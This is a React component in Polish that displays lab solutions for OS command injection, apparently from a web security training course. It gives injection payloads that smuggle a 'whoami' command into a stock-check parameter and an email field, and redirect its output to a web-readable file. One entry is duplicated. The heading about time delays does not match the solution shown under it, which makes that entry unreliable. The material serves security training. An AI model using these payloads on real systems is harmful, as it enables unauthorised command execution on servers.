const OSCommandInjection = () =>{
    return(
        <details>
            <summary>OS command injection</summary>

            <details>
                <summary>Wstrzyknięcie polecenia systemu operacyjnego, prosty przypadek</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>Pod url /product/stock w request możemy wstrzyknąć</p>
                    <p><span className="important">1|whoami</span></p>
                </div>
            </details>

            <details>
                <summary>Wstrzyknięcie polecenia systemu operacyjnego, prosty przypadek</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>Pod url /product/stock w request możemy wstrzyknąć</p>
                    <p><span className="important">1|whoami</span></p>
                </div>
            </details>
            
            <details>
                <summary>Ślepe wstrzykiwanie poleceń systemu operacyjnego z opóźnieniami czasowymi</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>Pod url submits feedback w request możemy wstrzyknąć</p>
                    <p><span className="important">email=||whoami{`>`}/var/www/images/output.txt||</span></p>
                    <p>Następnie modyfikujemy wartość filename</p>
                    <p><span className="important">filename=output.txt</span></p>
                </div>
            </details>
        </details>
                  
    )
}

export default OSCommandInjection;